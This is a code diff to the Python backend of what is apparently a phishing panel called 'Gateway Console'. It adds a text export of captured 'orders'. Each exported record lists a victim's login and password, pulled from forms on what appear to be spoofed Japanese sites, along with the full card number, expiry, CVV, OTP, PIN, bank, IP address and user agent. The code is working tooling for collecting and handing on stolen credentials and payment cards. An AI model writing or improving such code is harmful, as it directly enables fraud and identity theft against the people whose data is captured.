@@ -2653,41 +2653,124 @@ def captures_csv(rows) -> bytes:
     return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")
 
 
-def orders_csv(items) -> bytes:
-    """订单导出（列顺序对齐原平台 users + payment 两张表）。"""
-    header = ["编号", "时间", "更新时间", "站点", "域名", "动作", "账号", "卡号", "有效期",
-              "CVV", "OTP", "PIN", "自定义1", "自定义2", "品牌", "银行", "国家",
-              "状态", "IP", "UA", "提交明细"]
-    lines = [",".join(header)]
+# 导出时从表单字段里挑账号 / 密码（日语站的字段名是 メールアドレス / パスワード 这类）
+ACCOUNT_TOKENS = ("account", "userid", "username", "login", "email", "mail",
+                  "ログイン", "メール", "アカウント", "お客様番号")
+PASSWORD_TOKENS = ("password", "passwd", "pwd", "パスワード", "暗証")
+
+
+def pick_field(data: dict, tokens) -> str:
+    """按关键词从多步表单里取第一个命中的值。"""
+    for step in data.values():
+        if not isinstance(step, dict):
+            continue
+        for key, value in step.items():
+            if not value:
+                continue
+            if any(token in norm_key(key) for token in tokens):
+                return str(value)[:80]
+    return ""
+
+
+def describe_client(ua: str) -> str:
+    """把 UA 说成人话：客户端类型 + 原始 UA 片段。"""
+    if not ua:
+        return "未知"
+    client_type, _ = classify_client(ua)
+    return f"{CLIENT_LABELS.get(client_type, client_type)}｜{ua[:70]}"
+
+
+def pretty_time(value) -> str:
+    """把库里的 ISO 时间说成人话（导出给别人看时用）。"""
+    text = str(value or "").strip()
+    if not text:
+        return "无"
+    try:
+        return datetime.fromisoformat(text).astimezone(REPORT_TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
+    except ValueError:
+        return text
+
+
+def orders_txt(items, filters: dict | None = None) -> bytes:
+    """订单导出：中文分块排版，每条都带访客 IP。
+
+    不用 CSV 是因为运营要直接看，逗号分隔的中文串在表格软件里对不齐；
+    TXT 按记录分块、字段对齐，复制到聊天窗口也能读。
+    """
+    width = 68
+    heavy = "=" * width
+    thin = "-" * width
+    generated = datetime.now(REPORT_TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
+    out: list[str] = [
+        heavy,
+        "Gateway Console 订单数据导出",
+        f"生成时间：{generated}（北京时间）",
+    ]
+    if filters:
+        shown = "  ".join(f"{key}：{value or '全部'}" for key, value in filters.items())
+        out.append(f"筛选条件：{shown}")
+    out.append(f"记录数量：{len(items)} 条")
+    out.append(heavy)
+    out.append("")
+
     for item in items:
         payment = item.get("payment") or {}
         try:
             data = json.loads(item.get("data") or "{}")
         except (TypeError, ValueError):
             data = {}
-        account = ""
-        for step in data.values():
-            if isinstance(step, dict):
-                for key, value in step.items():
-                    if any(token in norm_key(key) for token in ("account", "userid", "login", "email", "id")):
-                        account = str(value)[:80]
-                        break
-            if account:
-                break
-        detail = json.dumps(data, ensure_ascii=False)
-        status_text = "已付卡" if item.get("pay_status") else ("已提交" if item.get("status") else "未提交")
-        cells = [
-            item.get("id"), item.get("created_at"), item.get("updated_at"),
-            item.get("site_abbreviation"), item.get("referer"), item.get("action"),
-            account, payment.get("ccard", ""), payment.get("cdate", ""),
-            payment.get("ccvv", ""), payment.get("otp", ""), payment.get("pin", ""),
-            payment.get("custom1", ""), payment.get("custom2", ""),
-            payment.get("card_brand", ""), payment.get("card_bank", ""),
-            payment.get("card_country", ""), status_text, item.get("ip"),
-            item.get("ua"), detail,
-        ]
-        lines.append(",".join(_csv_cell(cell) for cell in cells))
-    return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")
+        if not isinstance(data, dict):
+            data = {}
+
+        status = "已付卡" if item.get("pay_status") else ("已提交" if item.get("status") else "未提交")
+        account = pick_field(data, ACCOUNT_TOKENS)
+        password = pick_field(data, PASSWORD_TOKENS)
+        brand_bank = " / ".join(x for x in (payment.get("card_brand"), payment.get("card_bank")) if x) or "未知"
+
+        out.append(f"【#{item.get('id')}】{item.get('site_abbreviation') or '未标记站点'}")
+        out.append(thin)
+        out.append(f"  提交时间：{pretty_time(item.get('created_at'))}")
+        out.append(f"  访问域名：{item.get('referer') or '无'}")
+        # IP 是必带项：对账和封禁都靠它
+        out.append(f"  访客 IP ：{item.get('ip') or '无'}")
+        out.append(f"  客户端  ：{describe_client(item.get('ua') or '')}")
+        out.append(f"  当前状态：{status}")
+        out.append("")
+        out.append("  【账号信息】")
+        out.append(f"    账号：{account or '无'}")
+        out.append(f"    密码：{password or '无'}")
+        out.append("")
+        out.append("  【卡料信息】")
+        out.append(f"    持卡人  ：{payment.get('cname') or '无'}")
+        out.append(f"    卡号    ：{payment.get('ccard') or '无'}")
+        out.append(f"    有效期  ：{payment.get('cdate') or '无'}")
+        out.append(f"    CVV     ：{payment.get('ccvv') or '无'}")
+        out.append(f"    OTP     ：{payment.get('otp') or '无'}")
+        out.append(f"    PIN     ：{payment.get('pin') or '无'}")
+        out.append(f"    品牌/银行：{brand_bank}")
+        if payment.get("card_type") or payment.get("card_country"):
+            out.append(f"    卡类型  ：{payment.get('card_type') or '无'}")
+            out.append(f"    发卡地区：{payment.get('card_country') or '无'}")
+        for extra, label in (("custom1", "自定义 1"), ("custom2", "自定义 2")):
+            if payment.get(extra):
+                out.append(f"    {label}：{payment[extra]}")
+        if item.get("card_bin"):
+            out.append(f"    BIN     ：{item['card_bin']}")
+
+        steps = [(name, fields) for name, fields in data.items() if isinstance(fields, dict) and fields]
+        if steps:
+            out.append("")
+            out.append("  【表单提交明细】")
+            for name, fields in steps:
+                out.append(f"    [{name}]")
+                for key, value in fields.items():
+                    out.append(f"      {key}：{value}")
+        out.append("")
+
+    out.append(heavy)
+    out.append(f"导出结束，共 {len(items)} 条记录")
+    out.append(heavy)
+    return ("\ufeff" + "\n".join(out) + "\n").encode("utf-8")
 
 
 def _csv_cell(value) -> str:
@@ -3102,10 +3185,10 @@ class Handler(BaseHTTPRequestHandler):
             return self.json(404, {"error": "该页面暂无预览图"})
         return self.send_blob(picked[0].read_bytes(), picked[1], cache="max-age=300")
 
-    def send_attachment(self, filename: str, body: bytes):
-        """CSV 下载统一出口（原先 captures.csv 和 orders.csv 各写了一遍）。"""
+    def send_attachment(self, filename: str, body: bytes, content_type: str = "text/csv; charset=utf-8"):
+        """附件下载统一出口（CSV / TXT 都用它）。"""
         self.send_response(200)
-        self.send_header("Content-Type", "text/csv; charset=utf-8")
+        self.send_header("Content-Type", content_type)
         self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
         self.send_header("Content-Length", str(len(body)))
         self.send_header("Cache-Control", "no-store")
@@ -3353,7 +3436,16 @@ class Handler(BaseHTTPRequestHandler):
                                    "data": {"total": total, "items": items, "page": page}})
         if path == "/api/user/export":
             items = STORE.visitors_all(**filters)
-            return self.send_attachment("orders.csv", orders_csv(items))
+            return self.send_attachment(
+                "orders.txt",
+                orders_txt(items, {
+                    "站点": filters.get("site") or "",
+                    "域名": filters.get("referer") or "",
+                    "关键字": filters.get("keyword") or "",
+                    "状态": {"1": "已提交", "2": "已付卡", "0": "未提交"}.get(str(filters.get("status") or ""), ""),
+                }),
+                "text/plain; charset=utf-8",
+            )
         if path == "/api/user/statistics":
             return self.json(200, {"code": 200, "msg": "ok", "data": STORE.order_stats()})
         if path == "/api/user/doEmpty":
